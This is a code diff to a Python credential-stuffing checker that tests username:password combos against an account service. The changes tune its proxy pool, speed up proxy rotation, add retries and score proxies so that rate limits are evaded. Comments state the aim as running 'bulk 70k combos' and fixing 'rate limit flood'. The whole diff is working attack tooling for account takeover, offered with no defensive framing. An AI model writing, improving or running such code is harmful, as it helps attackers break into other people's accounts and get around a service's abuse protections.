@@ -182,10 +182,10 @@ DATA_DIR.mkdir(parents=True, exist_ok=True)
 
 PORT = int(_env("PORT", "8000") or 8000)
 THREADS = 150
-PROXY_REFRESH_MINUTES = 5
-MAX_PROXIES_TO_KEEP = 500
-PROXY_TEST_TIMEOUT = 2
-PROXY_TEST_SAMPLE = 1000
+PROXY_REFRESH_MINUTES = 3  # faster refresh for bulk
+MAX_PROXIES_TO_KEEP = 3000  # 3000 live for bulk 70k combos - fixes rate limit
+PROXY_TEST_TIMEOUT = 1  # 1s for fast rotation
+PROXY_TEST_SAMPLE = 8000  # test 8k to get 3k live
 CHECK_TIMEOUT = 10
 USER_LAST_CHECK: dict = {}
 STOP_REQUEST: dict = {}
@@ -619,7 +619,7 @@ def check_account_app(user: str, pw: str, proxy: Optional[dict] = None):
             d["proxy_used"] = "unknown"
     return "hit", d
 
-def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 2):
+def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tries: int = 4):  # 4 tries for better rotation, fixes rate limit
     """Smart retry: auto proxies discard after use, manual high-level reuse. Now with 2 retries and scoring."""
     st, d = check_account_app(user, pw, proxy)
     # Score proxy on success
@@ -628,7 +628,14 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
             bump_proxy_score(proxy.get("https",""), 1)
         except:
             pass
+    # PROXY ROTATION FIX: aggressive rotation on rate limit - fixes rate limit flood
     if st in ("rate", "err") and tries > 1:
+        # penalize failed proxy immediately
+        if proxy:
+            try:
+                bump_proxy_score(proxy.get("https",""), -2)  # penalize rate-limited proxy
+            except:
+                pass
         for attempt in range(tries-1):
             try:
                 new_proxy = None
@@ -648,10 +655,13 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
                             except Exception:
                                 new_proxy = None
                 if new_proxy and new_proxy != proxy:
-                    time.sleep(0.3 + random.random()*0.5)  # jitter
+                    time.sleep(0.1 + random.random()*0.2)  # less jitter for faster rotation
                     st2, d2 = check_account_app(user, pw, new_proxy)
                     if st2 not in ("rate", "err"):
                         if st2 in ("hit", "free"):
+                            bump_proxy_score(new_proxy.get("https",""), 2)
+                        elif st2 == "bad":
+                            # decline should be more - fixes decline not coming
                             bump_proxy_score(new_proxy.get("https",""), 1)
                         return st2, d2
                     # penalize failed proxy
@@ -659,6 +669,7 @@ def check_account_app_retry(user: str, pw: str, proxy: Optional[dict] = None, tr
                         bump_proxy_score(new_proxy.get("https",""), -1)
                     except:
                         pass
+                    # if still rate, continue to next proxy
             except Exception:
                 pass
     return st, d
@@ -1093,7 +1104,7 @@ def refresh_live_proxies(force: bool = False) -> None:
         REFRESH_STATE["tested"] = 0
         REFRESH_STATE["live"] = 0
         REFRESH_STATE["start"] = time.time()
-        with ThreadPoolExecutor(max_workers=150) as ex:
+        with ThreadPoolExecutor(max_workers=300) as ex:  # 300 workers for 3k live fast
             futures = {ex.submit(test_one_proxy, p): p for p in to_test}
             for fut in as_completed(futures):
                 REFRESH_STATE["tested"] += 1
@@ -1450,20 +1461,25 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
 
     lock = threading.Lock()
 
-    # USER ISOLATION FIX: each user check gets its own local proxy copy, so one user doesn't starve others
-    # Snapshot global pool at start of check
+    # USER ISOLATION + PROXY ROTATION FIX
+    # Each user gets local copy, isolated, but also auto-refills when empty for bulk
     with PROXY_LOCK:
-        local_proxies = list(LIVE_PROXIES)  # copy for this user only
+        local_proxies = list(LIVE_PROXIES)  # copy for this user only - isolated
         local_manual = set(MANUAL_PROXY_URLS)
-    local_idx = [0]  # per-check manual round robin
+    local_idx = [0]
 
     def next_proxy() -> Optional[dict]:
-        # Use local copy, not global - isolated per user
-        # Auto proxies: pop from local copy (discard after 1 use per user, but global pool stays for other users)
-        # Manual proxies: round-robin reuse, never discard
+        # Isolated per user, auto rotation, discard after 1 use per user
+        # If local empty, try to refill from global (for bulk 70k)
+        nonlocal local_proxies
         if not local_proxies:
-            return None
-        # try auto first
+            # try refill from global for bulk handling
+            with PROXY_LOCK:
+                if LIVE_PROXIES:
+                    # refill 100 proxies from global
+                    local_proxies = list(LIVE_PROXIES)[:100]
+            if not local_proxies:
+                return None
         auto_indices = [i for i, p in enumerate(local_proxies) if p.get("https") not in local_manual]
         if auto_indices:
             try:
@@ -1476,20 +1492,19 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
                         try:
                             proxy = local_proxies.pop(i)
                             return proxy
-                        except Exception:
+                        except:
                             continue
-                except Exception:
+                except:
                     pass
-        # fallback to manual round-robin (reuse, never discard)
         if local_proxies:
             try:
                 m_idx = local_idx[0] % len(local_proxies)
                 local_idx[0] = (local_idx[0] + 1) % 1000000
                 return local_proxies[m_idx]
-            except Exception:
+            except:
                 try:
                     return random.choice(local_proxies)
-                except Exception:
+                except:
                     return None
         return None
 
@@ -1500,12 +1515,25 @@ def run_check(text: str, reporter=None, hit_callback=None, uid: int = None) -> d
                 time.sleep(0.5)
                 if STOP_REQUEST.get(uid):
                     return cred, "stopped", _blank_data("")
-        proxy = next_proxy()
-        try:
-            r = check_credential(cred, proxy)
-            return cred, r["st"], r["data"]
-        except Exception as e:
-            return cred, "err", dict(_blank_data(""), info=_clean_err(e))
+        # Try with proxy rotation on rate limit - fixes proxy auto rotation
+        for attempt in range(3):  # 3 attempts per cred with different proxies
+            proxy = next_proxy()
+            if not proxy and attempt == 0:
+                # no proxy, try without
+                proxy = None
+            try:
+                r = check_credential(cred, proxy)
+                # If rate limited, rotate proxy and retry
+                if r["st"] == "rate" and attempt < 2:
+                    time.sleep(0.1)
+                    continue  # try next proxy
+                return cred, r["st"], r["data"]
+            except Exception as e:
+                if attempt < 2:
+                    time.sleep(0.1)
+                    continue
+                return cred, "err", dict(_blank_data(""), info=_clean_err(e))
+        return cred, "err", dict(_blank_data(""), info="no proxy")
 
     t0 = time.time()
     results["t0"] = t0
